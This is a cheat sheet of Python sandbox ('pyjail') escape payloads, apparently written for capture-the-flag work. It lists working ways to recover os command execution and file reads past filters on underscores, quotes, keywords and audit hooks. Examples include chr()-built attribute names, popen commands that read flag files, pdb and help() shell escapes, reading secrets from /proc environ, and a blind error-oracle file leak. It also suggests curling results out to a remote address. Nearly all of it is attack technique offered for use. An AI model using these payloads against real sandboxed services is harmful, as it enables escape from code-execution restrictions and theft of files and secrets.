# Python jail (pyjail) escape — version-agnostic technique payloads

Restricted eval/exec → arbitrary exec / file read. Probe the filter first (is `().__class__` alive? `import` blocked?
dots/underscores/quotes filtered? audit hooks?), then use the matching recovery in `poc.py`. One blocked vector ≠ dead:
switch recovery (subclasses ↔ builtins-dict ↔ frame ↔ audit-miss). Finish by reading the flag path (target convention).

## Output channel (blindness — read first)
HTTP jails (`POST {"code": …}`) usually do NOT relay server stdout: `os.system` writes to server console → you see nothing.
Default to capture-and-print: `__import__('os').popen('id; cat /challenge/flag*').read()` and `print(...)` / return it.
Probe with `print(open('/etc/hostname').read())` to confirm which channel (stdout / return value / error text) is visible
before spending attempts — errors are often echoed even when stdout is not (error-oracle below).

## Filter → recovery matrix
- `__`/underscores filtered → build attr names without literal underscores:
  `getattr((), chr(95)*2+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(95)*2)` (= `().__class__`), then walk as in poc.py.
  `dir()` index fishing is version-fragile — enumerate names first, never trust hardcoded subclass indices.
- keyword substring filtered (`os`,`system`,`import` in source) → concat `'sy'+'stem'`, chr-chains, `''.join([...])`.
- quotes filtered → `chr()` everywhere (poc.py #5); no-quote path read: `open(chr(47)+chr(99)+chr(104)...)`.
- spaces filtered → bracket-index + parens (`().__getattribute__(...)`), `exec` with `\n` separators.
- interactive tty jail (rare on HTTP) → `breakpoint()` (pdb → `import os`), `help()` pager → `!sh`.
- audit hooks installed (PEP 578; `subprocess`/`os.system` raise) → hooks usually cover `exec`/`import` events only:
  fall back to pure file-read (#4) / `os.listdir` / pre-opened fds; read secrets from `/proc/<pid>/environ` of the jail.
- totally blind (no output channel) → boolean error-oracle: `assert open('/challenge/flag.txt').read()[i]==chr(99)`
  (error vs no-error = 1 bit; loop the index), or OOB: payload `curl`s the result back to the engine's VPN address.

## Version notes
`__loader__.load_module` is removed in 3.12; subclass rosters shift across versions — always resolve by `__name__`
match (`_wrap_close`, `catch_warnings`, `FileIO`), never by fixed index. `catch_warnings()._module.__builtins__`
also yields the full builtins dict directly when `__import__` itself was dropped from it.
